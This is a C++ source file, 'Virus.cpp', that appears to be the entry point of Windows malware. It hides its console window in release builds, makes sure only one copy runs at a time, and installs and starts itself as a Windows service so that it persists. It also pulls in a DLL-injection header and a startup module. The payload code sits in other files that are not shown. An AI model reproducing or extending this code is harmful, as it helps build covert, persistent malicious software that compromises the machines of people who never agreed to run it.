// Virus.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include "VirusService.h"
#include "..\..\System\File\FileEx.h"
#include "StartUp.h"
#include "..\..\System\Process\JectDll.h"
#include "..\..\System\system\System.h"
#include "Virus.h"

static bool runAsService = false;

static INT processParams(int argc, _TCHAR * argv[])
{
	INT nRet = 0;
	for(int i = 1; i < argc; i++)
	{
		if(_tcsicmp(argv[i], _T("-service")) == 0)
		{
			runAsService = TRUE;
		}// 结束 if(_tcsicmp(argv[i], _T("-service")) == 0)
		if(_tcsicmp(argv[i], _T("-remove")) == 0)
		{
			_tstring szService;
			CFileEx fe;
			if(!fe.GetModuleFileName())
			{
				return 1;
			}// 结束 (!fe.GetModuleFileName())
			szService = fe.GetFileTitle();
			CVirusService s(szService.c_str());
			s.UnLoad();
			return 1;
		}// 结束 if(_tcsicmp(argv[i], _T("-remove")) == 0)
	}
	return nRet;
}

CVirusService * g_pService;

int _tmain(int argc, _TCHAR* argv[])
{
#ifndef _DEBUG
	FreeConsole();
#endif
	if(processParams(argc, argv))
	{
		return 5;
	} // 结束 if(processParams(argc, argv))

	_tstring szService;
	CFileEx fe;
	if(!fe.GetModuleFileName())
	{
		return 1;
	}// 结束 (!fe.GetModuleFileName())
	szService = fe.GetFileTitle();
	CVirusService s(szService.c_str());
	g_pService = &s;

	// 使程序互斥运行(同时只运行一个实例)
	HANDLE hMutex = CreateMutex(NULL, FALSE, szService.c_str());
	if(NULL == hMutex)
	{
#ifdef _DEBUG
		MessageBox(NULL, _T("建立互斥量出错,程序已经运行!"), NULL, MB_OK);
		return 2;
#endif // 结束 #ifdef _DEBUG
	} // 结束 if(NULL == hMutex)
	if(GetLastError() == ERROR_ALREADY_EXISTS)
	{
		//CloseHandle(hMutex);
#ifdef _DEBUG
		MessageBox(NULL, _T("程序已经运行!"), NULL, MB_OK);
#endif
		return 3;
	}

	if(runAsService)
	{
		//作为服务程序
		s.start();
	}
	else
	{
#ifdef _DEBUG
		s.run();
#else
		//作为安装服务程序
		s.InstallAndStartService();
#endif
	} // 结束 if(runAsService)

	if(hMutex)
	{
		CloseHandle(hMutex);
	} // 结束 if(hMutex)

	return 0;
}